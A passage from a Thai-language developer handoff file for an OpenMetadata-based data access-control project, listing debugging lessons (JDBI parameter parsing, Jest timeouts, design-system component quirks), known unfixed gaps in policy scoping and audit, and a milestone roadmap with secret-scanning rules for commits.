- ❌ **ตั้งค่า `environment.getObjectMapper()` แล้วคิดว่า response จะเปลี่ยนตาม** — **ไม่เปลี่ยน** · Jersey resolve ObjectMapper ผ่าน **`ContextResolver<ObjectMapper>`** ก่อน ถ้าไม่มีก็ใช้ default ของมันเอง -> ต้อง register `@Provider` เอง (`json/JsonMapperProvider.java`) · วิธีพิสูจน์ที่เร็วที่สุดคือ log ค่า flag เทียบกับ response จริง ถ้า flag ถูกแต่ response ผิด แปลว่าคนละ instance
- ❌ **คิดว่า description จาก OM เป็น plain text** — มันเป็น **HTML** (`<p>...</p>`) ตั้งแต่ 2.0 -> ต้องผ่าน `lib/text.ts::plainText()` ก่อน render เสมอ
- ❌ **login แล้วอ่าน `token`** — field ที่ backend คืนคือ **`accessToken`** ไม่ใช่ `token`
- ❌ **ใช้ account คนจริงของ OpenMetadata เป็น connector credential** — เปลี่ยนไปใช้ **ingestion-bot JWT** แล้ว (mint ครั้งเดียว เก็บใน `.env`) · password ของ account คนจริงที่เคยวางในแชต **ผู้ใช้ควร rotate**
- ✅ **full sync กับ OM จริงสำเร็จ**: ~9 วินาที · **33 tables · 352 columns · 4,302 แถวใน `asset_facet`**
- ⚠️ **glossary facet ว่างเปล่า** — ไม่ใช่บั๊ก: OM instance นี้ยังไม่มีใครติด glossary term ให้ asset เลย (มีแต่ตัว glossary) → อย่าไปไล่หาสาเหตุใน mapper
- ❌ **`TRUNCATE asset, …` ใน IT** — `cannot truncate a table referenced in a foreign key constraint` เพราะ `policy_binding` (V3) / `enforcement_state` (V4) อ้าง `asset(id)` · แก้โดย **ไล่ชื่อตารางให้ครบ ไม่ใช้ `CASCADE`** — ตารางใหม่จะได้ fail ดังๆ ไม่ใช่ถูกล้างเงียบๆ
- ❌ **`assertThat(jdbi.withHandle(…))` → ambiguous** — ดึงออกมาเป็น local ที่ type ชัดก่อน
- ❌ **อ่าน exit code ของ background task แทนที่จะอ่าน log** — คำสั่งที่ต่อท้ายด้วย `; echo ...` หรือ `; tail ...` จะรายงาน exit code **ของตัวสุดท้าย** ไม่ใช่ของ maven → รอบนี้เห็น "exit 0" สองครั้งทั้งที่ compile พังจริง (`unclosed string literal`) · **ยืนยันด้วย surefire report หรือ `grep ERROR` ใน log เสมอ**
- ❌ **`-Dtest=Xxx` บน multi-module build** — module ที่ไม่มีเทสต์ชื่อนั้น (เช่น `dac-spec`) จะ fail ทั้ง build · property ที่ถูกคือ `-Dsurefire.failIfNoSpecifiedTests=false` ไม่ใช่ `-DfailIfNoSpecifiedTests=false` · วิธีที่สั้นกว่าคือรันทั้ง module ไปเลย
- ❌ **เขียน `
` ใน string ของ Java ผ่านสคริปต์ Python heredoc** — backslash ถูกตีความก่อนถึงไฟล์ กลายเป็น newline จริงกลาง string literal → **ใช้ text block (`"""`) เขียน SQL หลายบรรทัดแทน** อ่านง่ายกว่าและไม่มีทางโดน escape กินกลางทาง

### Frontend
- ❌ **`apiErrorMessage(error)`** — signature คือ **`apiErrorMessage(error: unknown, fallback: string)` สองอาร์กิวเมนต์** ลืมตัวที่สอง = compile error (เจอ 4 จุดรอบนี้)
- ❌ **`<Button href="/policies/new">`** — design-system `Button` จะ render เป็น `AriaLink` = **full page reload กลางๆ SPA** → ใช้ `useNavigate()` + `onPress` แทน
- ❌ **`onClick` บน `Button` ของ design system** — ต้อง **`onPress`** และ **`isDisabled`** ไม่ใช่ `disabled` (`<button>` ธรรมดายังใช้ `onClick` ตามปกติ)
- ❌ **ใช้ชื่อแท็บเป็น facet type ตอนลิงก์ไป catalog** — `facet_type` จริงคือ `tags | classifications | terms | glossaries | domains | dataProducts` · root ใต้ Classifications เป็น `classifications` แต่ลูกของมันเป็น `tags` → ถ้าส่งชื่อแท็บไปทั้งก้อน แถว tag จะลิงก์ไปที่ filter ที่ match ศูนย์แถว · แก้ด้วย `facetOf(tab, value)`
- ❌ **`NavItemBase.iconOnly` ใช้ไม่ได้** — prop ประกาศไว้ใน interface แต่ **ไม่ถูก destructure หรือใช้ใน body เลย** ทั้งสาม branch -> จะทำ icon rail ต้องเขียน nav item เอง อย่าส่ง prop นี้แล้วรอให้มันทำงาน
- ❌ **สไตล์ active state โดยแก้ vendored component** — `scripts/sync-om-design-system.sh` จะทับกลับ · และการเขียนเป็น rule ใน `theme/overrides.css` ก็พิสูจน์แล้วว่าตามยาก -> **ประกาศ class สีไว้บน element ใน component ของเราเอง**
- ❌ **`Tooltip` ครอบ `<button>` ธรรมดา** — ไม่ขึ้น · `TooltipTrigger` ของ react-aria ส่ง hover/focus handler ให้เฉพาะ trigger ที่รับมันเป็น (`AriaButton`, `Focusable`) · `<a>` ของ `NavLink` ก็เหมือนกัน ตอนพับรางจึงใช้ `title` ธรรมดาแทน
- ❌ **JDBI + `[1:3]` (array slice ของ Postgres) ในคิวรี** — เหตุผลเดียวกับ `ESCAPE '\'` ข้างล่าง: JDBI สแกน SQL หา named parameter เอง แล้วอ่าน `:3` เป็นพารามิเตอร์ชื่อ `3` → `UnableToCreateStatementException: Missing named parameter '3'` **ทุกครั้งที่เรียก** โดยที่ compile ผ่านและหน้าจอขึ้นแค่ error กลางๆ → **อย่าใส่ `:` ดิบๆ ใน SQL ที่ผ่าน JDBI** ไม่ว่าจะเป็น slice, cast `::`(ตัวนี้ JDBI รู้จัก) หรืออะไรก็ตาม — ถ้าเลี่ยงได้ให้ไปทำใน Java
- ❌ **JDBI + `ESCAPE '\'` ในคิวรี** — JDBI สแกน SQL เองเพื่อหา named parameter · backslash ใน string literal ทำให้มันคิดว่า string ยังไม่ปิด แล้ว `:name` ทุกตัวหลังจุดนั้น **ไม่ถูก bind** → Postgres ตอบ `syntax error at or near ":"` (เสีย 1 รอบ build กับเรื่องนี้) · **ใช้ `ESCAPE '!'` แทน** แล้ว escape เป็น `!!` / `!%` / `!_`
- ❌ **ให้ search ของ column match `fqn` ด้วย** — fqn ของ column ลงท้ายด้วย fqn ของ table ผลคือพิมพ์ชื่อ table แล้วได้ column ทุกตัวในตารางนั้นขึ้นมากลบตัว table เอง → column ต้อง match **เฉพาะ `name`**
- ❌ **ยกม่าน loading หลัง `await signIn()` สำเร็จ** — มีเฟรมที่ token มีแล้วแต่ม่านยังไม่ขึ้น หน้า guarded วาดแลบผ่าน (ผู้ใช้เห็นและชี้) → **ยกม่านตั้งแต่ submit** แล้วปิดทิ้งตอน error
- ❌ **fade หน้าใหม่โดยไม่ใส่ `key`** — element เดิมอยู่ยาว animation เล่นครั้งเดียวตอนเปิดหน้าแรกแล้วเงียบตลอดกาล → `key={pathname+search}` บังคับ remount
- ❌ **หน่วง transition ด้วยการเลื่อน `key` ของ wrapper** (เวอร์ชันแรกของ `RouteTransition`) — `key` คุมแค่ "remount เมื่อไหร่" **ไม่ได้คุมว่า render อะไร** · `children` เป็น `<Outlet />` ซึ่งอ่าน router context ตอน render อยู่แล้ว หน้าใหม่จึงขึ้นทันทีที่คลิก พอครบ 520ms `key` เปลี่ยน มันก็ remount หน้าเดิมที่เห็นอยู่แล้วพร้อม fade → อาการที่ผู้ใช้เจอคือ **"เปลี่ยนเลย แล้วค่อยแวบ"** เป๊ะตามที่ code ทำ (คอมเมนต์ในไฟล์เขียนว่า "หน้าเก่าค้างไว้" ทั้งที่ไม่เคยเก็บ element เก่าไว้เลย — comment ที่โกหกตัวเอง)
- ❌ **snapshot `children` ใส่ state เพื่อค้างหน้าเก่า** — คิดไว้เป็นทางแก้แล้วตัดทิ้ง เพราะ **ใช้ไม่ได้**: `<Outlet />` เป็น element ที่ผูกกับ context ไม่ใช่ snapshot ของ DOM · เก็บ element เดิมไว้ มันก็ render route ใหม่อยู่ดี → ต้องหน่วงที่ **location** (`<Routes location={display}>`) เท่านั้น
- ❌ **`onClick` บนแถวผลลัพธ์ที่อยู่ใน dropdown ของ input** — blur ของ input ปิด panel ทิ้งก่อนคลิกจะลง → `onMouseDown` + `preventDefault()`
- ❌ **`type="badge-modern"`** — ค่าที่ถูกคือ `type="modern"` · และ `Badge` ควรส่ง `type` ชัดเจนเสมอเพื่อให้ generic `BadgeColor<T>` inference ทำงาน
- ❌ **Jest พังทั้ง suite เพราะ `import logo from '…png'`** — แก้ด้วย `moduleNameMapper` → `src/__mocks__/fileMock.cjs` · **บทเรียน: รัน `yarn test` เต็มชุดทุกครั้ง**
- ❌ **`@testing-library/user-event` ไม่ได้ติดตั้ง** — ใช้ `fireEvent`
- ❌ **build ทับ jar ใต้ JVM ที่กำลังรันอยู่** — `verify` repackage `dac-service.jar` ทับไฟล์ที่ JVM เปิดค้างไว้ → endpoint ที่ login ไปแล้วยังทำงาน แต่ endpoint ที่ยังไม่เคยถูกเรียกจะพ่น `ClassNotFoundException` / `NoClassDefFoundError` ของคลาสใน jar ตัวเอง (รอบนี้เจ๊ `io.dropwizard.util.Throwables`, `org.glassfish.jersey.internal.inject.InjecteeImpl`) และ curl ได้ HTTP 000 — **ไม่ใช่บั๊กโค้ด แต่เสียเวลาไล่เหมือนเป็นบั๊ก** → **restart backend ทุกครั้งหลัง build ก่อนยิงทดสอบ**
- ❌ **jest default `testTimeout` 5s กับ ts-jest** — `findBy*` ตัวแรกของ suite จ่ายค่า type-check + compile กอง design system ทั้งกองไปด้วย (หลายสิบวินาทีต่อ suite ตอนเครื่องมีโหลด) → suite ที่ render หน้าหนักสุด (policy builder, app roles) **พังคนละชุดทุกรอบ** โดยที่โค้ดไม่ได้เปลี่ยน · timeout ที่ยิงตอน compile ไม่ได้บอกอะไรเกี่ยวกับโค้ด → **มีนาฬิกาสองตัว ต้องตั้งทั้งคู่** — `testTimeout: 30000` ใน `jest.config.cjs` (งบต่อเทสต์) และ `configure({ asyncUtilTimeout: 15000 })` ใน `src/setupTests.ts` (งบของ `findBy*` เอง default แค่ **1s**) · ตัวหลังหลอกที่สุด เพราะมันขึ้นว่า `Unable to find an element with the text: …` พร้อม dump DOM — อ่านเหมือน assertion ผิด ทั้งที่ DOM นั้นคือหน้าจอที่ render ทันในหนึ่งวินาที ไม่ใช่หน้าจอสุดท้าย
- ❌ Playwright browsers ไม่ได้ติดตั้ง — ใช้ `chromium.launch({ channel: 'msedge' })` และ script ต้องอยู่ใน `frontend/app/`
- ❌ **`shortFqn` ฉบับแรกคืน "สอง segment ท้าย"** — ใช้ไม่ได้กับข้อมูลจริง เพราะ domain สองชั้นท้ายยาวชั้นละ ~45 ตัวอักษร ผลคือชิปยาวเท่าเดิม → ต้องคิดเป็น **งบของ parent** (`PARENT_BUDGET = 18`) แล้วยุบ parent ที่ยาวเกินงบเป็น `…`
- ❌ **คิดจะตัด parent ทิ้งเสมอให้เหลือแค่ leaf** — `PII.Sensitive` กับ `MFEC-PDPA.Sentitive` จะเหลือ `Sensitive`/`Sentitive` ที่แยกไม่ออกว่ามาจากหมวดไหน = ชิปที่อ่านง่ายแต่ผิด
- ❌ **ปล่อยให้ `Badge` wrap เอง** — `Badge` ของ design system เป็น `size-max whitespace-nowrap` มันจะไม่ wrap แต่จะ**ยืด**จนดันทั้งแถว → ต้อง `max-w-*` ที่ `Badge` + `truncate` ที่ span ข้างใน
- ⚠️ MCP connector หลายตัวของ claude.ai ยังไม่ได้ authorize — session แบบ non-interactive ทำ OAuth ไม่ได้ ต้องไปกดใน claude.ai connector settings

---

## ช่องว่างที่รู้ตัวแล้วแต่ยังไม่ได้แก้

เขียนไว้ตรงนี้เพราะทุกข้อ **ดูเหมือนทำงานปกติจากข้างนอก** — เป็นชนิดที่จะถูกค้นพบตอนผิดแล้ว ถ้าไม่จด

0. **(ข้อ BA) engine `SubjectMatcher.isOwner` ยังเทียบชื่อ owner ทั้งแบบ user และ team** — facet `OWNERS` (`FacetValue`) ไม่มี `owner_type` ติดมา จึงแยกไม่ได้ว่า `owner_o` เป็น user หรือ team → policy ที่ใช้ `assetOwner: true` ยังปล่อยสมาชิกของ team ที่ชื่อชนกับ user owner เข้าได้ · `mayDecide` ของคำขอแก้แล้ว (อ่าน `asset_owner.owner_type` ตรง) · ทางแก้: เพิ่ม type ลงใน facet value ตอน materialize (`user:owner_o` / `team:Finance`) แล้วแก้ `isOwner` + เทสต์ใน `SubjectRuleTest`
1. **`scopeFqn` ของ policy ระดับ DOMAIN / SERVICE / DATABASE ถูกใช้เป็น prefix ของ FQN ทางกายภาพ** — ผูก policy ไว้ที่ชื่อ domain (`Finance.Risk`) มันจะ bind ไม่ติดอะไรเลย ทั้งที่หน้าจอดูเหมือนสร้างสำเร็จ ต้องแยก scope เชิง governance ออกจาก scope เชิงกายภาพ
2. **ยังไม่มี write API สำหรับ *attribute* ของ local principal (FR-2.2) และการติด facet แบบ local (FR-1.7)** — *account กับ app role เขียนได้แล้วตั้งแต่หัวข้อ W* แต่ `principal_attribute` ของ `analyst_a` / `steward_c` และ tag ของ demo ยังถูก seed ด้วย SQL ตรงๆ ไม่มีทางทำผ่าน UI → **ABAC ครึ่งฝั่ง user ยังแก้จากหน้าจอไม่ได้**
3. ~~**`PolicyResource.affecting` default `environment` เป็น `"dev"`**~~ — **แก้แล้วรอบนี้ (ข้อ X.2)** ทุก endpoint ใช้ `environmentOr()` ที่ fallback เป็น `DecisionService.DEFAULT_ENVIRONMENT` และฝั่ง TS default เป็น `'prod'`
4. **audit ของการ configure ยังไม่ครบ** — *identity ครบแล้ว* (`audit_identity_change` จาก V10: สร้าง account, enable/disable, ตั้ง password, grant/revoke role) แต่ **เปลี่ยน data source, เปลี่ยน OM settings, enable/disable source ยังไม่ถูกบันทึกที่ไหน**
5. ~~**`audit_decision.evaluation_ms` ไม่เคยถูกเขียนค่า**~~ — **ปิดแล้วรอบนี้ (ข้อ AE.5)** จับเวลาที่จุดที่ผู้เรียกรอจริงใน `QueryService` · ยังเหลือการอ่านค่ามาทำ p95 report จริงๆ ซึ่งอยู่ใน M8
6. **capability matrix ยังไม่รู้จัก masking function ต่อ dialect และไม่รู้จักเวอร์ชันของ engine** — ดูหัวข้อ I ข้างบน
7. ~~**`CANNOT_LOOSEN` เป็นค่าตาย**~~ — **ปิดแล้ว (ข้อ Y.1)** ลบทิ้งทั้ง Java และ TS เพราะมันเป็นคำตอบของคนละแกนกับ `relation`
8a. **asset ที่ match data source ไม่ได้ ถูกเก็บเงียบๆ โดยที่ UI ไม่บอก** — `AssetStore` ใช้ `.orElse(null)` เมื่อหา `om_service_fqn` ไม่เจอ → ตอนนี้ **36 จาก 40 asset มี `data_source_id IS NULL`** เขียน policy ได้แต่ enforce ไม่ได้ · ต้องมี banner/badge บอก และควรมีหน้า "source ที่ยังไม่ผูก" (ดูข้อ AC.3)
9. 🪤 **`PolicyStore.create` เติม `environment = 'dev'` ให้ policy ที่ไม่ได้ระบุ ขณะที่ทุก decision ตัดสินใน `prod`** — policy แบบนั้น **save ผ่าน bind ติด activate ได้ อ่านกลับมาครบ และไม่เคยถูกเรียกใช้** (ข้อ AE.3) · ยังไม่แก้เพราะการสลับ default แปลว่าแถวเก่าทุกแถวที่นอนอยู่ใน `dev` จะเริ่มบังคับใช้ทันทีที่ deploy — ต้องทำพร้อม migration ที่ตัดสินใจให้แต่ละแถวอย่างตั้งใจ
10. **jar เปิดเดี่ยวๆ ที่ `/Arak/` ไม่ได้ ต้องมี nginx ตัด prefix ให้เสมอ** — `SpaServlet` ไม่รู้จัก `web.basePath` เลย มันเสิร์ฟจาก `/` ล้วน · ถ้าใครตั้ง `proxy_pass http://127.0.0.1:8090` **ลืม slash ท้าย** prefix จะไม่ถูกตัด → ทุก asset 404 → **หน้าขาว** โดยที่ log ของ service ไม่มีอะไรผิดเลย (ข้อ AE.7) · ตอน deploy ให้เช็คด้วย `curl -I http://127.0.0.1:8090/assets/<ชื่อไฟล์จริง>` ว่าต้องได้ 200

11. **ancestor ของ domain ถูกทำเครื่องหมายว่า `direct`** — หน้า `demo-pg.salesdb.sales.customer` มีชิป domain สามตัว (`Finance`, `Finance / Risk`, `… / Risk / Credit`) และ probe แล้ว **ทั้งสามตัวเป็น `is_direct = true`** ทั้งที่ FR-2A.2 บอกว่า ancestor ที่กางออกมาควรเป็น `false` เหลือเฉพาะตัวล่างสุด · ยังไม่ได้แก้เพราะต้องดู `asset_facet` จริงก่อนว่าเป็นที่ข้อมูลหรือที่ materializer — **ถ้าเป็นบักจริง มันทำให้ "tag นี้มาจากไหน" ตอบผิด** (ดูข้อ AG.5)

8. ~~**builder default `environment: 'dev'` ขณะที่ engine enforce `prod`**~~ — **ปิดแล้ว (ข้อ Y.2)** default เป็น `ENFORCED_ENVIRONMENT` ค่าเดียวที่ทุกฝั่งใช้ร่วมกัน + เตือนเมื่อเลือก environment ที่ไม่ถูก enforce

---

## Next Steps

- ✅ **ข้อ AY เสร็จแล้ว** (Open in OpenMetadata ไม่ 500 · Request access มุมขวาบน · หัวหน้า asset แบบ OM · seed เคส demo) — ต่อด้วย **M9 slice 2** ข้างล่าง

0. ✅ **M10 เสร็จ (ข้อ BE)** — Query log ตามหน้าที่ (V25) + Access Control Dashboard · **ต่อไป:** M9 recertification · แนบไฟล์ในคำขอ · export / SIEM ของ M8
0-BO. ✅ **ข้อ BO เสร็จ** — Preauthorization (V30): ขอล่วงหน้าให้ group/team/attribute สำหรับทุกตารางใต้ scope ที่มี tag/term/domain ตามที่ระบุ · coverage นับตาราง/คนโดยไม่บอกชื่อ · review เสนอ subscription policy เป็น DRAFT เท่านั้น · GRANT ถูกปฏิเสธ · template ของ scope บังคับด้วย · **ต่อไป:** M28 (AI ใน Catalog + Ask NokRak ใน global search) → Dashboard A/B/C
0-BN. ✅ **ข้อ BN เสร็จ** — Request access template (V31): ฟอร์มขอสิทธิ์ตั้งได้ใน Settings → Request templates ตาม scope และ tag/term ของตาราง (PII → purpose + DPIA number + สูงสุด 30 วัน) · guidance เป็น text ล้วน · server บังคับตาม template เอง · **ต่อไป:** Preauthorization (BO — `git stash pop` preauth-wip แล้วแก้ conflict ใน AccessRequestStore: templateName/reference + kind/target) → M28 (AI ใน Catalog + Ask NokRak ใน global search) → Dashboard A/B/C
0-BM. ✅ **ข้อ BM เสร็จ** — Catalog ติดป้าย Queryable / Metadata only + OpenMetadata / Read from source ทุกแถว (list · tree · detail) + filter 2 ตัว · ~~ชื่อผู้สร้างใต้ ©~~ (เอาออกแล้วตามที่ผู้ใช้สั่ง) · น้องรักษ์ (NokRak) มีกล่องคำพูดสุ่ม · **ต่อไป:** Preauthorization (BN) → Request access template ใน Settings → M28 (AI ใน Catalog + Ask NokRak ใน global search) → Dashboard A/B/C
0-BL. ✅ **ข้อ BL เสร็จ** — หน้า Governance เป็นตารางเดียว หัว Name / Assets / Policies คอลัมน์ตรงกัน · FQN ยาวของ sub-domain ย้ายเป็น tooltip · empty state · **ต่อไป:** Preauthorization Access Request (V30 + store เขียนแล้ว ยังไม่ commit) · AI ใน Catalog / global search · Dashboard ปรับแต่งได้ · M28
0-BK. ✅ **ข้อ BK เสร็จ** — คำขอเปิดเต็มหน้าที่ `/requests/REQ-000042` (ปุ่ม Full page / ลิงก์เลข ticket / วาง URL) · ช่องค้นหาคำขอรอ Enter · **ต่อไป:** Preauthorization Access Request · Dashboard ปรับแต่งได้ (coverage แยกตาม classification + เลือก measure + จัด layout เอง) · M28
0-BJ. ✅ **ข้อ BJ เสร็จ** — Catalog แสดง hierarchy: ปุ่ม List / Hierarchy (tree โหลดทีละชั้น) + แท็บ Databases / Schemas / Tables ในหน้า container · `?parent=` + `childCount` · **ต่อไป:** Preauthorization Access Request · M28 แชท agent
0-BI. ✅ **ข้อ BI เสร็จ** — เลข Ticket ของคำขอ REQ-000042 (V28) ค้นหา / copy ได้ · **ต่อไป:** Preauthorization Access Request (ตาม tag / attribute ของ table → ให้ attribute ของคน หรือ group) · Catalog แสดง hierarchy (Database → Schema → Table) · M28 แชท agent
0-BF. ✅ **ข้อ BF เสร็จ** — rail จัดเองได้ต่อคน (V26) + เลือกขนาด Comfortable / Compact (V27) · Enforcement และ System ย้ายเข้า Settings · Suggest พร้อม % · 🐛 parse error ของ Query · **ต่อไป:** M26 Fix with AI + Explain query → M28 แชท agent · ของค้าง (d) (f) (g) (j) (k) ดูข้อ BF.9
0-M9. ✅ **M9 slice 2c เสร็จ (ข้อ BD)** — Dashboard ใครใกล้หมดสิทธิ์ + นับถอยหลัง · สถิติคำขอต่อ table · ✅ slice 2b (ข้อ BC) · ✅ slice 2a (ข้อ BB) · **ต่อไป:** M9 ที่เหลือ — recertification / access review · break-glass · notification ออกนอกระบบ (ดูข้อ BD.7) — ผู้ใช้สั่ง *"ทำต่อได้เลยนะ เอาตาม Roadmap ทำไปเรื่อยๆ ต้องทดสอบให้ดีทุกขั้นตอน"*
0-เดิม. **(ส่วนที่เหลือของ AX.9 = 2b)** M9 slice 2 ดูข้อ AX.9: Approve = ตัดสินใจเท่านั้น → Fulfil ด้วยมือ (ออก grant / เพิ่มเข้า policy เดิม / สร้าง policy ใหม่เป็น Draft) โดย Owner · Steward · Custodian · หน้า review: ข้อมูลผู้ขอ + impact + risk + suggestion + conflict · ไอคอน Inbox + badge บน header
0a. **ถัดไป:** Flowchart สำหรับอ่านระดับ table บนหน้า asset (ผู้ใช้ขอแล้ว — toggle text/diagram แบบ `PolicyFlowChart`, ค่าเริ่มต้นเป็นหน้าเดิม)
0b. **M6 ⏸️ ON HOLD** — ห้ามเริ่มจนกว่าผู้ใช้จะสั่ง
0c. **M16 (LLM ช่วยหา asset)** แยกเป็นงานของมันเอง ไม่ได้อยู่ใน Suggest รอบนี้ — Suggest รอบนี้เป็น rule-based ล้วน ไม่ส่งอะไรให้ LLM

1. **push ให้ขึ้น** — local นำหน้า remote อยู่ (remote main ยังอยู่ที่ `0029375` — local นำอยู่ 11 commit หลัง commit รอบนี้) · แก้เรื่อง `git push` ค้างก่อน (ดู What Didn't Work) แล้วยืนยันด้วย `git ls-remote --heads origin` · **scan secret ก่อน push ทุกครั้ง**
2. ~~**FR-7 Manual grant**~~ — **ปิดแล้วจริงรอบนี้** · รอบที่แล้วปิดด้วยการเช็คด้วยมือซึ่งแยกไม่ออกว่า grant ทำงานหรือไม่เคยถูกโหลด (ข้อ AE.4) · ตอนนี้มี `GrantCompositionIT` 13 tests บน Postgres จริงคุมอยู่ และการเขียนมันคือสิ่งที่ทำให้เจอบั๊กข้อ AE.1/AE.2 · *บันทึกเดิมของงานนี้:* · grant ระดับ table ให้ user/group ตรงๆ พร้อม start/end date · หน้า asset รื้อเป็น tab **Overview / Access / Policies / Columns / Audit** (อ้างอิง Immuta แต่ใช้ theme เรา) · tab Access ต้อง**แยกให้ชัดว่าสิทธิมาจาก direct grant หรือมาจาก policy** · group รองรับทุกแหล่ง (local + OM team + Entra ในอนาคต) · **grant ไม่ชนะ global policy** — compose แบบ intersection เหมือนเดิม
2a. **ผูก `demo-pg` เข้ากับ service ของ OM** — *รอคำตอบผู้ใช้* ว่า `demo-pg` คือ `dtp-iprm` หรือคนละเครื่อง (ดูข้อ AC.3) · ตราบใดที่ยังไม่ผูก asset 36 ตัวจาก OM จริงยัง enforce ไม่ได้เลย
2b. ~~**รันซ้ำ `AssetStoreIT` + `CatalogQueryIT`**~~ — **เขียวแล้วรอบนี้** ยืนยันว่าข้อ AC.4 เป็นเรื่อง Docker ไม่ใช่ regression จริง
3. **ปิด M3** — เหลือ ANTLR grammar ของ `expr` (FR-3.2) ข้อเดียว (**decision cache FR-5.5 ปิดแล้ว ดูข้อ AB**)
3. ~~**ปิด M4**~~ — **ปิดแล้ว** (FR-3.1.5 ข้อ X · FR-5.2 ข้อ Z · FR-5.3 ข้อ AA) · ของที่ค้างไว้จาก M4 ต่อได้ถ้าต้องการ: impact analysis ยังวัดเฉพาะ **table binding** (COLUMN binding ถูกครอบด้วย TABLE row ที่ materializer เขียนไว้อยู่แล้ว) และ cap 25×200 ยังเป็นค่าตายในโค้ด ไม่ได้ config
4. **ปิดช่องว่างข้อ 1–5 ข้างบน** โดยเฉพาะ **ข้อ 4 (audit ของการ configure)** ซึ่งเป็นของที่ auditor จะถามหาแน่นอน
5. **M2** — write API ของ principal/attribute แล้วต่อ (ก) การ assign application role จริงในหน้า `/settings/roles` (ข) หน้า local group ที่ `/settings/groups` ซึ่ง card ในหน้า Settings ลิงก์ไปรออยู่แล้ว · *(filter ตาม attribute ในหน้า People เสร็จแล้ว — ดูข้อ U)*
6. **M5 (secure view)** — ~~ViewCompiler + maintainer + dry-run/apply/rollback + หน้าจอ~~ **เสร็จแล้ว (ข้อ AK · AT · AU · AW)** · เหลือ **slice 4 MSSQL Testcontainers** · credential แยกสำหรับ DDL · cutover helper (FR-6.1.1) · `DbPrincipalProvisioner` — ดูข้อ AW.12
7. **FR-1.6** — reconcile cache กับ JDBC introspection จริง (**รอ connection database จริงจากผู้ใช้**)
8. ~~**หน้าเปลี่ยนรหัสผ่าน**~~ — ✅ เสร็จแล้ว (ข้อ CG) · *บันทึกเดิม:* `mustChangePassword` ไหลถึง `auth/authStore.ts` แล้วแต่ไม่มีใครอ่าน
9. **ก่อน M6** ต้องได้คำตอบ: SQL Server production เป็น **2022+** ไหม (ต้องการสำหรับ `GRANT UNMASK` ระดับ column) และลง extension `anon` บน PostgreSQL ได้ไหม
10. **rebuild + restart backend ทุกครั้งที่แตะ backend** — รอบนี้ทำแล้ว (`requiredPrincipals` ข้อ R และ `attr` ข้อ U อยู่ใน jar ที่รันอยู่) · jar เก่าจะ**ไม่ error แต่เมินพารามิเตอร์ใหม่เงียบๆ** ซึ่งอ่านจากหน้าจอไม่ออก
11. งานเล็กที่ค้าง: refactor `jdbcUrl` ที่ยังเป็น private ใน `SourceProbe` ให้ไปอยู่บน `JdbcTargets` · golden-file test ของ dialect ทั้งสองตัว

**กติกาที่ต้องถือไว้ทุกครั้งที่ commit:** repo เป็น public -> scan หา password / JWT / hostname และ IP ภายใน ก่อน push เสมอ · ค่าจริง (`IDENTITY_BOOTSTRAP_ADMIN_PASSWORD`, `OM_WEBHOOK_SECRET`, `FERNET_KEY`, `SRC_PG_ARAK_CREDENTIAL`, bot JWT) อยู่ใน `.env` ที่ gitignore เท่านั้น · `.env.example` มีแต่ placeholder
**ผู้ใช้สั่งไว้:** *"อัพเดตไฟล์ handoff ทุกครั้งที่เอาขึ้น git"* — commit ที่ไม่มี HANDOFF.md ติดไปด้วย ถือว่ายังไม่เสร็จ
**ข้อจำกัดที่ผู้ใช้สั่งไว้:** ต่อ OpenMetadata **read อย่างเดียว** ตอนนี้ — ห้าม PATCH กลับ (FR-1.7 จึงยังไม่ทำ)

**คำสั่งที่ใช้บ่อย** — ดูหัวข้อ 7 ของ [docs/DESIGN.md](docs/DESIGN.md)
